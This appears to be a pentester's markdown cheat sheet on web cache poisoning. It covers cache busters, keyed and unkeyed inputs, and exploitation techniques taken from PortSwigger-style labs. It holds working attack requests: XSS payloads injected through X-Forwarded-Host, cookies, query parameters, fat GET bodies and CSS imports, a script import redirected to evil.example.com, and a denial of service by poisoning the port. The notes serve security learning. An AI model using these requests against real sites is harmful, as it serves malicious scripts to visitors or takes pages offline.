## Table of Contents

1. [Detecting Cached Responses](#detecting-cached-responses)
2. [Cache Buster](#cache-buster)
3. [Explanation of Keyed and Unkeyed](#Explanation-of-Keyed-and-Unkeyed)
4. [Exploiting Cache Design Flaws](#exploiting-cache-design-flaws)
   - [XSS via Unkeyed Headers](#using-web-cache-poisoning-to-deliver-an-xss-attack)
   - [Unkeyed Header Poisoning](#web-cache-poisoning-with-an-unkeyed-header)
   - [Unkeyed Cookie Poisoning](#web-cache-poisoning-with-an-unkeyed-cookie)
   - [Multiple Header Poisoning](#web-cache-poisoning-with-multiple-headers)
   - [Targeted Poisoning with Unknown Headers](#targeted-web-cache-poisoning-using-an-unknown-header)
   - [Exploiting DOM-Based Vulnerabilities](#using-web-cache-poisoning-to-exploit-dom-based-vulnerabilities)
   - [Chaining Vulnerabilities](#chaining-web-cache-poisoning-vulnerabilities)
5. [Exploiting Cache Key Implementation Flaws](#exploiting-cache-key-implementation-flaws)
   - [Unkeyed Port](#exploiting-unkeyed-port)
   - [Unkeyed Query String](#exploiting-an-unkeyed-query-string)
   - [Unkeyed Query Parameter](#exploiting-an-unkeyed-query-parameter)
   - [Cache Parameter Cloaking](#exploiting-with-cache-parameter-cloaking)
   - [Fat GET Support](#exploiting-fat-get-support)
   - [Dynamic Content in Resource Imports](#exploiting-dynamic-content-in-resource-imports)
   - [Normalized Cache Keys](#normalized-cache-keys)
   - [Cache Key Injection](#cache-key-injection)
6. [Poisoning Internal Caches](#poisoning-internal-caches)

---

## **Detecting Cached Responses**

Add a cache buster parameter ```?cb=1``` in the request. Change the number in the parameter before new request, so that we don't get a cached response. 
<br>
<br>
***Note:*** In some cases ```/?cb=1``` won't work. Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
<br>

***Note:*** Also we can use Param Miner for guessing header or query parameter for it.

Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request.
The following entries might all be cached separately but treated as equivalent to ```GET /``` on the back-end:
```
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
```
To confirm caching behavior, inspect response headers and time differences:

- **`X-Cache: hit`** – Response served from the cache.  
- **`X-Cache: miss`** – Response fetched from the origin server and potentially cached.  
- **`X-Cache: refresh`** – Cache was outdated and revalidated.

Additionally, check `Cache-Control` headers for caching directives like `public` with a non-zero `max-age`.

## Cache Buster

A **cache buster** is a technique used to prevent a web cache from serving a cached response, ensuring a fresh response is fetched from the origin server. It involves adding a unique parameter or value to a request that forces the cache to treat it as a new request, bypassing any cached content.

### Common Cache Buster Methods
1. **Query Parameter**:
   - Append a unique query parameter to the URL, such as `?cb=1`, and increment or change the value for each request (e.g., `?cb=2`, `?cb=12345`).
   - Example: `GET /page?cb=1 HTTP/1.1`
   - The cache treats each unique parameter value as a distinct request, avoiding cached responses.

2. **Alternative Headers**:
   - If query parameters don’t work, add cache-busting values to HTTP headers that don’t interfere with the application’s behavior.
   - Examples:
     ```
     Accept-Encoding: gzip, deflate, cachebuster
     Accept: */*, text/cachebuster
     Cookie: cachebuster=1
     Origin: https://cachebuster.vulnerable-website.com
     ```
---

# Explanation of Keyed and Unkeyed

### ✅ **Keyed (Secure)**

- **Definition**: The cache differentiates responses based on the **full request**, including query parameters (and sometimes headers like `User-Agent`, `Cookie`, etc.).
- **Behavior**:
  - Attacker sends:  
    `GET /profile?cb=xss HTTP/1.1`
  - This request is cached **under that exact URL** `/profile?cb=xss`
  - When the victim requests:  
    `GET /profile HTTP/1.1`
  - They get a **fresh, uncached response**, **not affected** by the attacker's request.

✔️ **Result**: Safe. Payloads from different URLs are not reused for other users.

---

### ❌ **Unkeyed (Vulnerable)**

- **Definition**: The cache treats different URLs (like `/profile` and `/profile?cb=xss`) as the **same key**, ignoring certain parts of the request like query parameters or headers.
- **Behavior**:
  - Attacker sends:  
    `GET /profile?cb=xss HTTP/1.1`
  - The response (with payload, e.g. reflected XSS) is cached **under the path `/profile`**
  - Victim requests:  
    `GET /profile HTTP/1.1`
  - They receive the **poisoned cached response**.

❗ **Result**: Vulnerable to **Web Cache Poisoning**, where attacker poisons the cache to serve malicious content to others.

---

# Exploiting cache design flaws

Websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequent HTTP responses to be cached.

## Using web cache poisoning to deliver an XSS attack

Consider the following request and response:

```txt
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:

```txt
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

If this response was cached, all users who accessed /en?region=uk would be served this XSS payload.

## Web cache poisoning with an unkeyed header

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead. We can use ```X-Forwarded-Host:``` header for this.

**Step**

  1. Add a cache buster parameter ?cb=1 in the request.
  2. Add X-forwarded-Host header in request.
  3. Add a arbitrary domain (evil.example.com) and send the request.
  4. If the evil.example.com reflected in response page, we can now place our malicious link in it.

```http
GET /assets/js/main.js?cb=1 HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.example.com
```

The malicius link contain with js file will trigger on all users browser if the site is vulnerable to the Web Cache Poisoning.

```js
<script src="https://evil.example.com/assets/js/main.js"></script>
```

**Note:** Remove cache buster before delivering final attack.

## Web cache poisoning with an unkeyed cookie

Cookies are often used to dynamically generate content in a response. If the response of the request is cached, then all subsequent users who tried to access the poisoned page will get the malicious content. 

**Step**
```
  1. Add a cache buster parameter ?cb=1 in the request.
  2. Identify if any cookie value reflecting in the response.
  3. If the cookie value reflected in response page, we can now place our malicious javascript code in it or arbitrary string in it.
```
**Note:** If the cookie header generated in http response, we should add the header in http request and sent a new request.<br>
<br>
Use this payload if the value reflected in a javascript string
```js
someString"-alert(1)-"someString
```
## Web cache poisoning with multiple headers

Identify any unkeyed header using param miner and craft a attack.

**Example:** Suppose there is a hidden ```X-Forwarded-Proto: http``` or ```X-Forwarded-Scheme: http```(This two header overrides the https with http) header that we have discovered manually or using param miner. If we add this header in a request, this will make 302 redirect to the main domain. If we add ```X-Forwarded-Host``` header in it and put our malicious domain, the site will redirected to our malicious domain.<br>
<br>
***Initial Request/Response***
```txt
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```
***Customized Request/Response***
```txt
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http
X-Forwarded-Host: evil.com

HTTP/1.1 301 moved permanently
Location: https://evil.com
```
If the website chaches static javascript file, we can poison it with malicious ```js``` code.<br>
<br>
Poc: [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

## Exploiting responses that expose too much information

Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior.

### Targeted web cache poisoning using an unknown header

```Vary``` header is used for sending device or client specific content. Using ```Vary``` header in responce, in some cases we can craft an attack.
<br>
<br>
Poc: [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

## Using web cache poisoning to exploit DOM-based vulnerabilities

## Chaining web cache poisoning vulnerabilities
---

# Exploiting cache key implementation flaws

## Exploiting unkeyed port

Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```

To test whether the port is excluded from the cache key, we first need to request an ```arbitrary port``` and make sure that we receive a fresh response from the server that reflects this input:
```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
Next, we'll send another request, but this time we won't specify a port:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```
As you can see, we have been served our cached response even though the Host header in the request does not specify a port. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired. This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example.

## Exploiting an unkeyed query string

In some scenario, the query parameter might be keyed so attackers payload will not served to other users. In this case identify an unkeyed  parameter that breaks out of the reflected string and inject an XSS payload.
**Example:**
```
GET /?evil='/><script>alert(1)</script>
```

**Note:** Use Param Miner for guessing Header or Parameters.

## Exploiting an unkeyed query parameter

Identify a query paramter manually or using Param Miner and inject an XSS payload.<br>
**Example:**
```
GET /?custom='/><script>alert(1)</script>
```
## Exploiting with Cache Parameter Cloaking

This is actually Sever Side Parameter Pollution. So, we would use the methodology of SSPP for exploiting this type of vulnerability. For example, Cache parameter cloaking occurs when a discrepancy exists between how the cache and server parse query parameters. If the cache treats every `?` as a new parameter delimiter, while the server only recognizes the first `?`, an attacker can inject payloads cloaked in excluded parameters. For example:

```
GET /?example=123?excluded_param=bad-stuff-here
```

The cache excludes `excluded_param` from the cache key but processes `example` as `123`. However, the server treats the entire string after the first `?` (`123?excluded_param=bad-stuff-here`) as the value of `example`. This mismatch can lead to successful payload injection without altering the cache key.

### Exploiting parameter parsing quirks

1. **Query String Parsing Quirks**: If a cache treats every `?` or other delimiter differently than the server, parameters may be excluded from the cache key but still processed by the server. For example:  
   ```
   GET /?example=123?excluded_param=bad-stuff
   ```
   The cache ignores `excluded_param`, but the server processes it, allowing payload injection.

2. **Semicolon Delimiters**: Some back-ends (e.g., Ruby on Rails) treat both `&` and `;` as parameter delimiters, while caches may not. For example:  
   ```
   GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff
   ```
   The cache only includes `keyed_param=abc` in its key, but the server processes the last `keyed_param=bad-stuff`, overriding the value and enabling payload injection.

3. **Exploiting Gadgets**: Using this method, you can inject and execute malicious payloads, such as overriding callback functions in JSONP requests to execute arbitrary JavaScript.

This allows for cache poisoning or XSS by taking advantage of parsing inconsistencies.

Poc: [Parameter cloaking](https://www.youtube.com/watch?v=vdb_9HACpkM)

### Exploiting fat GET support

In some cases, the HTTP method may not be keyed. This might allow you to poison the cache with a POST request containing a malicious payload in the body. Your payload would then even be served in response to users' GET requests.
<br>
<br>
**Request:**
```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

callback=alert(1)
```
**Response:**
```
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: max-age=35
Age: 2
X-Cache: hit

alert(1)({"country":"United Kingdom"});
```
In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.
<br>
<br>
Sometimes we can encourage "fat GET" handling by overriding the HTTP method via ```X-HTTP-Method-Override: POST``` header, for example:
```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
X-HTTP-Method-Override: POST

callback=alert(1)
```
As long as the ```X-HTTP-Method-Override``` header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line.

### Exploiting Dynamic Content in Resource Imports
 
Some CSS files reflect user input (query parameters) into their content dynamically. If improperly handled, this can allow attackers to inject malicious content into these CSS files. By combining this with **web cache poisoning**, the attacker can make others load and execute the malicious content.
<br>
<br>
A CSS file dynamically includes user-provided data in its content, for example:  
```
GET /style.css?excluded_param=123);@import…
```
The server responds with a CSS file that includes the query parameter:  
```css
@import url(/site/home/index.part1.css?excluded_param=123);@import…
```
An attacker injects malicious content into the query parameter to alter the CSS:  
```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
```
The server processes this input and reflects it into the CSS:  
```css
This request was blocked due to…alert(1){}*{color:red;}
```
If this CSS is imported into other pages, it can potentially execute **malicious actions globally**.

## Normalized cache keys

Details+Lab: [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#normalized-cache-keys)

## Cache key injection

---

# Poisoning internal caches
